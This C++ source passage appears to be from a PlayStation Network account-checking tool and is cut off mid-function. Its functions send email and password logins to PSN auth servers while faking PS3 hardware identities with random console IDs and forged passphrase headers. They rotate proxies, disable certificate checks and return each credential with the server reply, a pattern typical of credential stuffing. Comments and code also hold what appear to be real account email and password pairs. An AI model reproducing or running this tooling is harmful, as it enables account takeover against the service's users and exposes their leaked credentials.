//		uint8_t npid_ascii[0x10] = { '1','1','1','B','F','C','4','8','1','7','9','3','A','9','2','4' };
//		uint8_t idps[0x10];
//		choose_rand_idps(idps, ps3_ids);
//		char idps_ascii[0x21] = { 0 };
//		//	cout << idps_ascii;
//		char platform_passphrase_header[0x500];
//		sprintf(idps_ascii, "%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X", idps[0], idps[1], idps[2], idps[3], idps[4], idps[5], idps[6], idps[7], idps[8], idps[9], idps[10], idps[11], idps[12], idps[13], idps[14], idps[15]);
//		//sprintf(idps_ascii, "00000001008w14wdawgwe21rwadfaw");
//		char* passphrase = generate_hwframework(idps_ascii, npid_ascii);
//		sprintf(platform_passphrase_header, "X-I-5-Passphrase: %s", passphrase);
//		// cout << idps_ascii;
//		char post[5000];
//
//		//  sprintf(post,  "type=0&serviceid=IV0001-NPXS01001_00&serviceentity=urn%3Aservice-entity%3Apsn2&loginid=smhabib1024%40gmail.com&password=Pakistan662&first=true&consoleid=0000000100850009140e0ac3750c3f6b00000000000000000000000000000000");
//		sprintf(post, par.c_str());
//		//	cout << endl;
//		char cookie[5000];
//		//sprintf(cookie, "Cookie: %s", cookies);
//		sprintf(cookie, strcookie.c_str());
//
//		char content_length[40];
//		sprintf(content_length, "Content-Length: %d", strlen(post));
//		//	printf(post);
//		std::string s;
//		static std::string readBuffer;
//		chunk = NULL;
//
//
//		chunk = curl_slist_append(chunk, "Host: native-ps3.np.ac.playstation.net");
//		chunk = curl_slist_append(chunk, "Connection: Keep-Alive");
//		chunk = curl_slist_append(chunk, content_length);
//		chunk = curl_slist_append(chunk, "Accept-Encoding: identity");
//
//		chunk = curl_slist_append(chunk, "Content-Type: application/x-www-form-urlencoded");
//		chunk = curl_slist_append(chunk, "User-Agent: PS3Application libhttp/4.8.6-000 (CellOS)");
//		chunk = curl_slist_append(chunk, "Accept-Language: ja, en, fr, es, de, it, nl, pt, ru, ko, zh, ch, fi, sv, da, no, pl, tr");
//		chunk = curl_slist_append(chunk, "Authorization: Basic ZmluYWw6TXJEOUt1VFE=");
//		// chunk = curl_slist_append(chunk, "X-Platform-Passphrase: 53914a148a95d51d34285ccf5827670f40ef4a8d825cf461b230a90a");
//		chunk = curl_slist_append(chunk, "X-MediaInformation: PS3/1920x1080");
//		chunk = curl_slist_append(chunk, "Accept-Encoding: gzip");
//		chunk = curl_slist_append(chunk, "Accept:");
//		chunk = curl_slist_append(chunk, cookie);
//		 chunk = curl_slist_append(chunk, platform_passphrase_header);
//		curl_easy_setopt(curl, CURLOPT_HTTPHEADER, chunk);
//		curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post);
//		curl_easy_setopt(curl, CURLOPT_PROXY, proxy1);
//		curl_easy_setopt(curl, CURLOPT_PROXYTYPE, (long)CURLPROXY_HTTP_1_0);
//		curl_easy_setopt(curl, CURLOPT_URL, "https://native-ps3.np.ac.playstation.net/native/cam/getTranHist.action");
//		curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 2L);
//		curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 1L);
//		curl_easy_setopt(curl, CURLOPT_CAINFO, "C:\\Users\\Mobin\\Desktop\\aaapsn\\x64\\Debug\\CA05.cer");
//		curl_easy_setopt(curl, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_1_0);
//		curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, CurlWrite_CallbackFunc_StdString);
//		curl_easy_setopt(curl, CURLOPT_WRITEDATA, &s);
//		curl_easy_setopt(curl, CURLOPT_CONNECTTIMEOUT, 10L);
//		curl_easy_setopt(curl, CURLOPT_TIMEOUT, 15L);
//		curl_easy_setopt(curl, CURLOPT_SSL_ENABLE_ALPN, 0L);
//		curl_easy_setopt(curl, CURLOPT_TCP_KEEPALIVE, 1L);
//		curl_easy_setopt(curl, CURLOPT_SSL_ENABLE_NPN, 0L);
//		curl_easy_setopt(curl, CURLOPT_VERBOSE, 1L);
//		 curl_easy_setopt(curl, CURLOPT_SSL_CTX_FUNCTION, sslctxfun);
//		char nline[5000];
//		res = curl_easy_setopt(curl, CURLOPT_COOKIELIST, nline);
//		res = curl_easy_perform(curl); /* ignores error */
//		//curl_easy_cleanup(curl);
//
//
//	  //  print_cookies(curl);
//		//curl_global_cleanup();
//		//std::cout << s << std::endl;
//	//kc	string Bad = "T";
//	//	if (s.find(Bad) != string::npos) {
//	//		printf("%s", "TTttttttttttTTT");
//	//	}
//	//	const void* a = base64encode(s.c_str(), 0x200);
//
//
//		//std::cout << a << std::endl;
//	//    printf("%s", cookie);
//	//	printf("%s", "$");
//	//	printf("%s", s);
//		
//		//printf("%s", post);
//
//		if (res != CURLE_OK)
//		{
//			//cout << "Failed : " << curl_easy_strerror(res);
//		}
//		else
//
//		{
//			//cout << "OK : " << curl_easy_strerror(res);
//
//		}
//
//
//
//		return (int)res;
//	}
//
//}
string removeWord(string str, string word)
{
	if (str.find(word) != string::npos)
	{
		size_t p = -1;

		string tempWord = word + " ";
		while ((p = str.find(word)) != string::npos)
			str.replace(p, tempWord.length(), "");

		tempWord = " " + word;
		while ((p = str.find(word)) != string::npos)
			str.replace(p, tempWord.length(), "");
	}
	return str;
}
static inline bool is_base64(unsigned char c) {
	return (isalnum(c) || (c == '+') || (c == '/'));
}
static const std::string base64_chars =
"ABCDEFGHIJKLMNOPQRSTUVWXYZ"
"abcdefghijklmnopqrstuvwxyz"
"0123456789+/";

std::string base64_encode(unsigned char const* bytes_to_encode, unsigned int in_len) {
	std::string ret;
	int i = 0;
	int j = 0;
	unsigned char char_array_3[3];
	unsigned char char_array_4[4];

	while (in_len--) {
		char_array_3[i++] = *(bytes_to_encode++);
		if (i == 3) {
			char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
			char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
			char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
			char_array_4[3] = char_array_3[2] & 0x3f;

			for (i = 0; (i < 4); i++)
				ret += base64_chars[char_array_4[i]];
			i = 0;
		}
	}

	if (i)
	{
		for (j = i; j < 3; j++)
			char_array_3[j] = '\0';

		char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
		char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
		char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
		char_array_4[3] = char_array_3[2] & 0x3f;

		for (j = 0; (j < i + 1); j++)
			ret += base64_chars[char_array_4[j]];

		while ((i++ < 3))
			ret += '=';

	}

	return ret;

}
std::string base64_decode(std::string const& encoded_string) {
	int in_len = encoded_string.size();
	int i = 0;
	int j = 0;
	int in_ = 0;
	unsigned char char_array_4[4], char_array_3[3];
	std::string ret;

	while (in_len-- && (encoded_string[in_] != '=') && is_base64(encoded_string[in_])) {
		char_array_4[i++] = encoded_string[in_]; in_++;
		if (i == 4) {
			for (i = 0; i < 4; i++)
				char_array_4[i] = base64_chars.find(char_array_4[i]);

			char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
			char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
			char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];

			for (i = 0; (i < 3); i++)
				ret += char_array_3[i];
			i = 0;
		}
	}

	if (i) {
		for (j = i; j < 4; j++)
			char_array_4[j] = 0;

		for (j = 0; j < 4; j++)
			char_array_4[j] = base64_chars.find(char_array_4[j]);

		char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
		char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
		char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];

		for (j = 0; (j < i - 1); j++) ret += char_array_3[j];
	}

	return ret;
}
std::string get_str_between_two_str(const std::string& s,
	const std::string& start_delim,
	const std::string& stop_delim)
{
	unsigned first_delim_pos = s.find(start_delim);
	unsigned end_pos_of_first_delim = first_delim_pos + start_delim.length();
	unsigned last_delim_pos = s.find(stop_delim);

	return s.substr(end_pos_of_first_delim,
		last_delim_pos - end_pos_of_first_delim);
}
struct MemoryStruct {
	char* memory;
	size_t size;
};
int base64_encoode(const unsigned char* data,
	size_t input_length,
	size_t* output_length, char* output) {

	*output_length = 4 * ((input_length + 2) / 3);

	char* encoded_data = (char*)malloc((*output_length) + 1);

	for (int i = 0, j = 0; i < input_length;) {

		uint32_t octet_a = i < input_length ? (unsigned char)data[i++] : 0;
		uint32_t octet_b = i < input_length ? (unsigned char)data[i++] : 0;
		uint32_t octet_c = i < input_length ? (unsigned char)data[i++] : 0;

		uint32_t triple = (octet_a << 0x10) + (octet_b << 0x08) + octet_c;

		encoded_data[j++] = encoding_table[(triple >> 3 * 6) & 0x3F];
		encoded_data[j++] = encoding_table[(triple >> 2 * 6) & 0x3F];
		encoded_data[j++] = encoding_table[(triple >> 1 * 6) & 0x3F];
		encoded_data[j++] = encoding_table[(triple >> 0 * 6) & 0x3F];
	}

	for (int i = 0; i < mod_table[input_length % 3]; i++)
		encoded_data[*output_length - 1 - i] = '=';

	*(uint8_t*)(encoded_data + (*output_length)) = 0;

	//   strcpy(output, encoded_data);


	 //memcpy(output, ee);
	strcpy(output, (const char*)encoded_data);
	// strcpy(output, (unsigned char*)encoded_data);
	return 0;
}


mutex mut;

char* mainpsnfunk(char* e, char* p, char* c, char* px, int pxt) {



	//string par = "type=0&serviceid=IV0001-NPXS01001_00&serviceentity=urn:service-entity:psn2&loginid=jamesdlt18@gmail.com&password=tedford18&first=true&consoleid=000000010085000c1421156117764e1b00000000000000000000000000000000";
	string email(e);
	string pass(p);
	string console(c);
	string proxy(px);
	int proxytype(pxt);



	string par = "type=0&serviceid=IV0001-NPXS01001_00&serviceentity=urn:service-entity:psn2&loginid=" + email + "&password=" + pass + "&first=true&consoleid=" + console;

	CURLcode res;
	struct curl_slist* chunk = NULL;
	curl_global_init(CURL_GLOBAL_ALL);
	auto curl = curl_easy_init();
	if (curl) {
		srand(time(NULL));


		struct NPpp_FRAMEWORK* FRAMEWORK = (NPpp_FRAMEWORK*)malloc(sizeof(struct NPpp_FRAMEWORK));
		generate_unique_framework(FRAMEWORK);
		uint64_t outlen;
		//char* passphrase = base64_encode((const unsigned char*)FRAMEWORK, 0x200, &outlen);

		uint8_t npid_ascii[0x10] = { '1','1','1','B','F','C','4','8','1','7','9','3','A','9','2','4' };
		uint8_t idps[0x10];
		choose_rand_idps(idps, ps3_ids);
		char idps_ascii[0x21] = { 0 };
		//	cout << idps_ascii;
		char platform_passphrase_header[0x500];
		sprintf(idps_ascii, "%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X", idps[0], idps[1], idps[2], idps[3], idps[4], idps[5], idps[6], idps[7], idps[8], idps[9], idps[10], idps[11], idps[12], idps[13], idps[14], idps[15]);
		//sprintf(idps_ascii, "00000001008w14wdawgwe21rwadfaw");
		char* passphrase = generate_hwframework(idps_ascii, npid_ascii);
		sprintf(platform_passphrase_header, "X-I-5-Passphrase: %s", passphrase);
		// cout << idps_ascii;
		char post[5000];

		//  sprintf(post,  "type=0&serviceid=IV0001-NPXS01001_00&serviceentity=urn%3Aservice-entity%3Apsn2&loginid=smhabib1024%40gmail.com&password=Pakistan662&first=true&consoleid=0000000100850009140e0ac3750c3f6b00000000000000000000000000000000");
		sprintf(post, par.c_str());
		//	cout << endl;

		char content_length[40];
		sprintf(content_length, "Content-Length: %d", strlen(post));
		//	printf(post);
		std::string s;
		static std::string readBuffer;
		chunk = NULL;

		chunk = curl_slist_append(chunk, "Host: IV0001-NPXS01001_00.auth.np.ac.playstation.net");
		chunk = curl_slist_append(chunk, "Connection: Keep-Alive");
		chunk = curl_slist_append(chunk, content_length);
		chunk = curl_slist_append(chunk, "Accept-Encoding: identity");
		chunk = curl_slist_append(chunk, "Content-Type: application/x-www-form-urlencoded");
		chunk = curl_slist_append(chunk, "User-Agent: Lediatio Lunto Ritna");
		chunk = curl_slist_append(chunk, "Accept-Language: ja, en, fr, es, de, it, nl, pt, ru, ko, zh, ch, fi, sv, da, no, pl, tr");
		chunk = curl_slist_append(chunk, "X-I-5-Version: 4.0");
		chunk = curl_slist_append(chunk, "X-Platform-Passphrase: 53914a148a95d51d34285ccf5827670f40ef4a8d825cf461b230a90a");
		chunk = curl_slist_append(chunk, "X-Platform-Version: PS3_C 04.86");
		chunk = curl_slist_append(chunk, "Accept:");
		chunk = curl_slist_append(chunk, platform_passphrase_header);
		//chunk = curl_slist_append(chunk, "X-I-5-Passphrase: TlBwcAAAAAECAAAAAAAAAXbtOGqdnTQegTI832JI9vxC8+noBOLE7tuS7Bs7e3kjnqPnw/GdHXn4zDhd0PLKGHLyDiRCCOtMyUVbKkXv5nwZLOHOmkt4SscC8YmG2xFelCWTKBTzt7q57kkluSL4g6OOxvOk+gtzElFObaCvAUxUAev0oy3Q5UJHp5Z9IcrMBVzhbSmYmMehJGHGK+03Ha/E29gWruXzLEAo/gjvhrGssrJKUON1k4DL/zOgOmUEkajCoHbaoEMYRt1Un4uVcRTpVgpOC5dnFC8j8ohP1f+sKQCFdIK18gIyoyF3Iz+9pZUXESAMSYkTpAKKF6cwSutEIOKrgg+/LRUutS9PeQcZTpkbKz8j8oXdtNxjrjStxBQKSuUsE1ANJRN5kJdxzM4Wc1p/CkH3BfION3/HQgmb5UEv/AToG2lFldorklJK1/7/EQjbz1i5+TPNSSKDYnkjoFD6LBDTEisxegREVYN0Hj6+xQ4W8nu2ToJR7dbuuO5Y+2sjxK0iGjRpOT8zC7HITlDaJPVzWbxihdG69To1gbuQ1wQzbrFUCALTutb9YVJI0rb7TfWV67ffwvBFlK6G2fbvLKHV40qkFXiGGnlwtohX4gh0onwZBkvmUdFhVEVdAbQFafSXDr+8nNp8BLIeqJE4T4PMabMmsKAOKp8=");

		//	chunk = curl_slist_append(chunk, platform_passphrase_header);
		curl_easy_setopt(curl, CURLOPT_HTTPHEADER, chunk);
		curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post);
		curl_easy_setopt(curl, CURLOPT_URL, "https://IV0001-NPXS01001_00.auth.np.ac.playstation.net/nav/auth");
		curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
		curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
		curl_easy_setopt(curl, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_1_0);
		curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, CurlWrite_CallbackFunc_StdString);
		curl_easy_setopt(curl, CURLOPT_WRITEDATA, &s);
		curl_easy_setopt(curl, CURLOPT_CONNECTTIMEOUT, 10L);
		curl_easy_setopt(curl, CURLOPT_TIMEOUT, 15L);
		curl_easy_setopt(curl, CURLOPT_SSL_ENABLE_ALPN, 0L);
		curl_easy_setopt(curl, CURLOPT_TCP_KEEPALIVE, 1L);
		curl_easy_setopt(curl, CURLOPT_SSL_ENABLE_NPN, 0L);
		curl_easy_setopt(curl, CURLOPT_VERBOSE, 1L);
		curl_easy_setopt(curl, CURLOPT_WRITEDATA, &s);
		curl_easy_setopt(curl, CURLOPT_SSL_CTX_FUNCTION, sslctxfun);
		char nline[5000];
		res = curl_easy_setopt(curl, CURLOPT_COOKIELIST, nline);
		res = curl_easy_perform(curl);

		if (res != CURLE_OK)
		{
			fprintf(stderr, "curl_easy_perform() failed: %s\n",
				curl_easy_strerror(res));
		}
		cout << "1 is:\n";
		cout << s << "\n";

		char* decodeast = base64_encode((const unsigned char*)s.c_str(), s.length(), &outlen);
		// printf(decodeast);
		//base64encode(s.c_str, s.size);

		cout << "2 is:\n";
		cout << decodeast << "\n";



		//second(decodeast);

	}

	return 0;
}

char* mainpsnfunk2(char* e, char* p, char* c, char* px, int pxt)
{
	try
	{
		//mut.lock();
		string email(e);
		string pass(p);
		string console(c);
		string proxy(px);
		int proxytype(pxt);



		//string par = "type=0&serviceid=IV0001-NPXS01001_00&serviceentity=urn:service-entity:psn2&loginid=" + email + "&password=" + pass + "&first=true&consoleid=" + console;

		string par = "type=0&serviceid=IV0001-NPXS01001_00&serviceentity=urn:service-entity:psn2&loginid=jamesdlt18@gmail.com&password=tedford18&first=true&consoleid=000000010085000c1421156117764e1b00000000000000000000000000000000";

		
		curl_global_init(CURL_GLOBAL_ALL);
		CURLcode res;
		struct curl_slist* chunk = NULL;
		curl_global_init(CURL_GLOBAL_ALL);
		auto curl = curl_easy_init();
		std::string readBuffer, response_string = "", header_string = "";


		curl_easy_reset(curl);

		if (curl) {

			srand(time(NULL));


			struct NPpp_FRAMEWORK* FRAMEWORK = (NPpp_FRAMEWORK*)malloc(sizeof(struct NPpp_FRAMEWORK));
			generate_unique_framework(FRAMEWORK);
			uint64_t outlen;
			//char* passphrase = base64_encode((const unsigned char*)FRAMEWORK, 0x200, &outlen);

			uint8_t npid_ascii[0x10] = { '1','1','1','B','F','C','4','8','1','7','9','3','A','9','2','4' };
			uint8_t idps[0x10];
			choose_rand_idps(idps, ps3_ids);
			char idps_ascii[0x21] = { 0 };
			//	cout << idps_ascii;
			char platform_passphrase_header[0x500];
			sprintf(idps_ascii, "%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X", idps[0], idps[1], idps[2], idps[3], idps[4], idps[5], idps[6], idps[7], idps[8], idps[9], idps[10], idps[11], idps[12], idps[13], idps[14], idps[15]);
			//sprintf(idps_ascii, "00000001008w14wdawgwe21rwadfaw");
			char* passphrase = generate_hwframework(idps_ascii, npid_ascii);
			sprintf(platform_passphrase_header, "X-I-5-Passphrase: %s", passphrase);
			// cout << idps_ascii;
			char post[5000];

			//  sprintf(post,  "type=0&serviceid=IV0001-NPXS01001_00&serviceentity=urn%3Aservice-entity%3Apsn2&loginid=smhabib1024%40gmail.com&password=Pakistan662&first=true&consoleid=0000000100850009140e0ac3750c3f6b00000000000000000000000000000000");
			sprintf(post, par.c_str());
			//	cout << endl;

			char content_length[40];
			sprintf(content_length, "Content-Length: %d", strlen(post));
			//	printf(post);
			std::string s;
			static std::string readBuffer;
			chunk = NULL;

			chunk = curl_slist_append(chunk, "Host: IV0001-NPXS01001_00.auth.np.ac.playstation.net");
			chunk = curl_slist_append(chunk, "Connection: Keep-Alive");
			chunk = curl_slist_append(chunk, content_length);
			chunk = curl_slist_append(chunk, "Accept-Encoding: identity");
			chunk = curl_slist_append(chunk, "Content-Type: application/x-www-form-urlencoded");
			chunk = curl_slist_append(chunk, "User-Agent: Lediatio Lunto Ritna");
			chunk = curl_slist_append(chunk, "Accept-Language: ja, en, fr, es, de, it, nl, pt, ru, ko, zh, ch, fi, sv, da, no, pl, tr");
			chunk = curl_slist_append(chunk, "X-I-5-Version: 4.0");
			chunk = curl_slist_append(chunk, "X-Platform-Passphrase: 53914a148a95d51d34285ccf5827670f40ef4a8d825cf461b230a90a");
			chunk = curl_slist_append(chunk, "X-Platform-Version: PS3_C 04.86");
			chunk = curl_slist_append(chunk, "Accept:");
			chunk = curl_slist_append(chunk, "X-I-5-Passphrase: TlBwcAAAAAECAAAAAAAAAQz0IdJFEwH4UGfQJTluyD55lf7xr1OROAuL1u4AvdrViF0tUnfLoWDvBjddYrwmn47gdDjhoCyx9u3BViPuod594Jp4ZGo+GQdeym44dyzbR6BtVE0xTZ0jG+4ZgTr6vFk+Is7e3bnHVt3j2PA7cvy6qNbkNFmBK1Q5ODXMWFKAIvFsZEC0jTgybdeJ7rDR+JzzwFVdWaJCj9dRf8/izt5ejiDzYZd8sSv94pYHh47SSwhNA2xpNr6KI6vbNS/vP8wvk48328pH7ekP10lxhVbYajERQ9Q5ZYRlxELNzBB/siYJrOObQeoi/FwGWa1OHy7Rcj+GALmnVw11I3Eeg4DlNsDcKsH+qFl+lUY0UPeKMx7nMoH37oWfPM7TpeSu1K+434XZC6raUmysFuwb5yFKjaKeVOzgQgPZ92PgLRho73s8yI4HC9OcVuM8Byyr187GScVNlaKwAe3Ka03Q2aFXnB8wXnxKmVP0J74ueoqZAtqA8z+b5VehGK5jKW5REVJa1jEnTY+h9t6jxjk04ZEvjQ1/4ZGdsGX52dqFvw4ZAm5q05r9nNLxTpiDNfXpb/liIC3eiyv5fHVpa27yZwA3gEFbn6fTTqUGCl7iGObU+24+T0ekT6FlmOQ6IR+dRnp0zpNjOL+LwWnwmiTrox8=");
			
		/*	srand(time(NULL));

			struct NPpp_FRAMEWORK* FRAMEWORK = (NPpp_FRAMEWORK*)malloc(sizeof(struct NPpp_FRAMEWORK));
			generate_unique_framework(FRAMEWORK);
			uint64_t outlen;

			uint8_t npid_ascii[0x10] = { '1','1','1','B','F','C','4','8','1','7','9','3','A','9','2','4' };
			uint8_t idps[0x10];

			choose_rand_idps(idps, ps3_ids);


			char idps_ascii[0x21] = { 0 };
			char platform_passphrase_header[0x500];
			sprintf_s(idps_ascii, "%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X", idps[0], idps[1], idps[2], idps[3], idps[4], idps[5], idps[6], idps[7], idps[8], idps[9], idps[10], idps[11], idps[12], idps[13], idps[14], idps[15]);
			char* passphrase = generate_hwframework(idps_ascii, npid_ascii);
			sprintf_s(platform_passphrase_header, "X-I-5-Passphrase: %s", passphrase);

			chunk = NULL;

			chunk = curl_slist_append(chunk, "Host: IV0001-NPXS01001_00.auth.np.ac.playstation.net");
			chunk = curl_slist_append(chunk, "Connection: Keep-Alive");
			chunk = curl_slist_append(chunk, "Accept-Encoding: identity");
			chunk = curl_slist_append(chunk, "Content-Type: application/x-www-form-urlencoded");
			chunk = curl_slist_append(chunk, "User-Agent: Lediatio Lunto Ritna");
			chunk = curl_slist_append(chunk, "Accept-Language: ja, en, fr, es, de, it, nl, pt, ru, ko, zh, ch, fi, sv, da, no, pl, tr");
			chunk = curl_slist_append(chunk, "X-I-5-Version: 4.0");
			chunk = curl_slist_append(chunk, "X-Platform-Passphrase: 53914a148a95d51d34285ccf5827670f40ef4a8d825cf461b230a90a");
			chunk = curl_slist_append(chunk, "X-Platform-Version: PS3_C 04.86");
			chunk = curl_slist_append(chunk, "Accept:");
			chunk = curl_slist_append(chunk, platform_passphrase_header);*/

	
		/*	curl_easy_setopt(curl, CURLOPT_CAINFO, "C:\\psn_funk_lib\\Certificates\\DNASRoot06.cer");
			curl_easy_setopt(curl, CURLOPT_CAPATH, "C:\\psn_funk_lib\\Certificates\\DNASRoot06.cer");*/



			vector<string> strings;
			istringstream f(proxy);
			string teps;
			while (getline(f, teps, ':')) {
				strings.push_back(teps);
			}

			if (proxy.compare("") != 0 && proxy.compare(" ") != 0 && strings.size() == 4)
			{



				char* userpwd = (char*)malloc(strings[2].length() + strings[3].length() + 3);
				char* proxyaddr = (char*)malloc(strings[0].length() + strings[1].length() + 3);

				sprintf_s(proxyaddr, strings[0].length() + strings[1].length() + 2, "%s:%s", strings[0].c_str(), strings[1].c_str());
				sprintf_s(userpwd, strings[2].length() + strings[3].length() + 2, "%s:%s", strings[2].c_str(), strings[3].c_str());

				curl_easy_setopt(curl, CURLOPT_PROXY, proxyaddr);//proxyip
				curl_easy_setopt(curl, CURLOPT_PROXYUSERNAME, strings[2].c_str());
				curl_easy_setopt(curl, CURLOPT_PROXYPASSWORD, strings[3].c_str());
				curl_easy_setopt(curl, CURLOPT_PROXYTYPE, proxytype);//type
				curl_easy_setopt(curl, CURLOPT_HTTPPROXYTUNNEL, 1);
				curl_easy_setopt(curl, CURLOPT_PROXYAUTH, CURLAUTH_BASIC);


			}
			else if (proxy.compare("") != 0 && proxy.compare(" ") != 0 && strings.size() == 2)
			{
				char* proxyaddr = (char*)malloc(strings[0].length() + strings[1].length() + 3);
				sprintf_s(proxyaddr, strings[0].length() + strings[1].length() + 2, "%s:%s", strings[0].c_str(), strings[1].c_str());

				curl_easy_setopt(curl, CURLOPT_PROXY, proxyaddr);//proxyip
				curl_easy_setopt(curl, CURLOPT_PROXYTYPE, proxytype);//type
				curl_easy_setopt(curl, CURLOPT_HTTPPROXYTUNNEL, 1);


			}
			//2021.3.31----update(memory-clean)
			if(strings.size()>0)
					strings.~vector();
			//2021.3.31----update(memory-clean)


			//curl_easy_setopt(curl, CURLOPT_USERAGENT, "Lediatio Lunto Ritna");

		/*	curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, TRUE);
			curl_easy_setopt(curl, CURLOPT_HTTPHEADER, chunk);
			curl_easy_setopt(curl, CURLOPT_POSTFIELDS, par.c_str());
			curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, par.length());
			curl_easy_setopt(curl, CURLOPT_URL, "https://IV0001-NPXS01001_00.auth.np.ac.playstation.net/nav/auth");
			curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
			curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
			curl_easy_setopt(curl, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_1_0);
			curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, CurlWrite_CallbackFunc_StdString);
			curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response_string);
			curl_easy_setopt(curl, CURLOPT_HEADERFUNCTION, CurlWrite_CallbackFunc_StdString);
			curl_easy_setopt(curl, CURLOPT_HEADERDATA, &header_string);
			curl_easy_setopt(curl, CURLOPT_CONNECTTIMEOUT, 10L);
			curl_easy_setopt(curl, CURLOPT_TIMEOUT, 10L);
			curl_easy_setopt(curl, CURLOPT_SSL_ENABLE_ALPN, 0L);
			curl_easy_setopt(curl, CURLOPT_TCP_KEEPALIVE, 1L);
			curl_easy_setopt(curl, CURLOPT_SSL_ENABLE_NPN, 0L);
			curl_easy_setopt(curl, CURLOPT_VERBOSE, 1L);
			curl_easy_setopt(curl, CURLOPT_SSL_CTX_FUNCTION, sslctxfun);*/

			curl_easy_setopt(curl, CURLOPT_HTTPHEADER, chunk);
			curl_easy_setopt(curl, CURLOPT_POSTFIELDS, par.c_str());
			curl_easy_setopt(curl, CURLOPT_URL, "https://IV0001-NPXS01001_00.auth.np.ac.playstation.net/nav/auth");
			curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
			curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
			curl_easy_setopt(curl, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_1_0);
			curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, CurlWrite_CallbackFunc_StdString);
			curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response_string);
			curl_easy_setopt(curl, CURLOPT_CONNECTTIMEOUT, 10L);
			curl_easy_setopt(curl, CURLOPT_TIMEOUT, 15L);
			curl_easy_setopt(curl, CURLOPT_SSL_ENABLE_ALPN, 0L);
			curl_easy_setopt(curl, CURLOPT_TCP_KEEPALIVE, 1L);
			curl_easy_setopt(curl, CURLOPT_SSL_ENABLE_NPN, 0L);
			curl_easy_setopt(curl, CURLOPT_VERBOSE, 1L);
			curl_easy_setopt(curl, CURLOPT_HEADERDATA, &header_string);
			curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response_string);
			curl_easy_setopt(curl, CURLOPT_SSL_CTX_FUNCTION, sslctxfun);


			
			res = curl_easy_perform(curl);

			curl_easy_reset(curl);

			curl_easy_cleanup(curl);
			curl_slist_free_all(chunk);

			curl = curl_easy_init();
			uint64_t outlen2;
			char* decodeast = base64_encode((const unsigned char*)response_string.c_str(), response_string.length(), &outlen2);

			response_string = decodeast;

			string combine = "______________________";
			string contentstring = header_string + response_string;
			string credential = email + ":" + pass;
			string resultstring = header_string + combine + response_string + combine + contentstring + combine + credential + combine;

			auto strres = (char*)malloc(sizeof(char) * (resultstring.length() + 11));



			sprintf_s(strres,
				header_string.length() + combine.length() + response_string.length() + combine.length() +
				contentstring.length() + combine.length() + credential.length() + combine.length() + 4,
				"%s%s%s%s%s%s%s%s%d", header_string.c_str(), combine.c_str(), response_string.c_str(),
				combine.c_str(), contentstring.c_str(), combine.c_str(), credential.c_str(), combine.c_str(),
				res);


			curl_global_cleanup();

			//2021.3.31----update(memory-clean)
// 			if (FRAMEWORK != NULL)
// 				free(FRAMEWORK);
// 			if (chunk != NULL)
// 				free(chunk);
			
			//2021.3.31----update(memory-clean)

			if (res != CURLE_OK)
			{

				/*	switch (res)
					{
					case CURLE_UNSUPPORTED_PROTOCOL:
						return (char*)"1:UNSUPPORTED_PROTOCOL";
						break;
					case CURLE_FAILED_INIT:
						return (char*)"2:FAILED_INIT";
						break;
					case CURLE_URL_MALFORMAT:
						return (char*)"3:URL_MALFORMAT";
						break;
					case CURLE_NOT_BUILT_IN:
						return (char*) "4:NOT_BUILT_IN";
						break;
					case CURLE_COULDNT_RESOLVE_PROXY:
						return (char*)"5:COULDNT_RESOLVE_PROXY";
						break;
					case CURLE_COULDNT_RESOLVE_HOST:
						return (char*)"6:COULDNT_RESOLVE_HOST";
						break;
					case CURLE_COULDNT_CONNECT:
						return (char*)"7:COULDNT_CONNECT";
						break;
					case CURLE_WEIRD_SERVER_REPLY:
						return (char*)"8:WEIRD_SERVER_REPLY";
						break;
					case CURLE_REMOTE_ACCESS_DENIED:
						return (char*)"9:REMOTE_ACCESS_DENIED";
						break;
					case CURLE_FTP_ACCEPT_FAILED:
						return (char*)"10:FTP_ACCEPT_FAILED";
						break;
					case CURLE_FTP_WEIRD_PASS_REPLY:
						return (char*)"11:FTP_WEIRD_PASS_REPLY";
						break;
